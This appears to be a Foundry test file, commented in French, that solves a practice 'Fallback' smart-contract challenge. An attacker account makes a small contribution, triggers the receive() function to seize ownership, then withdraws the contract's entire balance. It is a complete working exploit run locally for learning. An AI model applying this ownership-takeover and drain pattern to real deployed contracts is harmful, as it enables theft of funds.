// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Fallback} from "./1-Fallback.sol";
import {Test, console} from "forge-std/Test.sol";

contract FallbackTest is Test {
    Fallback public fallbackContract;
    address public owner;
    address public attacker;

    function setUp() public {
        // Utiliser les adresses Hardhat par défaut
        // Account #0: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 (10000 ETH)
        // Account #1: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 (10000 ETH)

        owner = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        attacker = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

        // Deploy le contrat avec l'owner
        vm.prank(owner);
        fallbackContract = new Fallback();

        // Donne des fonds à l'attaquant
        vm.deal(attacker, 10 ether);

        // Ajouter 5 ETH au contrat
        vm.deal(address(fallbackContract), 5 ether);

        console.log("Owner initial:", fallbackContract.owner());
        console.log("Attacker address:", attacker);
    }

    /**
     * Devenir propriétaire du contrat et recuperer les fonds.
     */
    function test_hack() public {
        vm.startPrank(attacker);
        console.log("Balance de l'attaquant:", attacker.balance);
        // ÉTAPE 1: Contribuer pour être dans la mapping
        // Il faut contribuer un montant > 0 pour être enregistré
        fallbackContract.contribute{value: 0.0003 ether}();

        // ÉTAPE 2: Exploiter la fonction receive() pour devenir owner
        // En envoyant de l'ETH directement au contrat avec une contribution existante
        (bool success, ) = address(fallbackContract).call{value: 0.0004 ether}(
            ""
        );
        require(success, "Transfer failed");

        // Vérifier qu'on est devenu owner
        assertEq(
            fallbackContract.owner(),
            attacker,
            "L'attaquant devrait etre owner"
        );
        console.log("Nouvel owner:", fallbackContract.owner());

        // ÉTAPE 3: Retirer tous les fonds
        uint256 contractBalance = address(fallbackContract).balance;
        console.log("Balance du contrat avant withdraw:", contractBalance);

        fallbackContract.withdraw();

        vm.stopPrank();
        console.log(
            "Balance du contrat apres withdraw:",
            address(fallbackContract).balance
        );
        console.log("Balance de l'attaquant:", attacker.balance);

        // Vérifications finales
        assertEq(
            address(fallbackContract).balance,
            0,
            "Le contrat devrait etre vide"
        );
    }
}
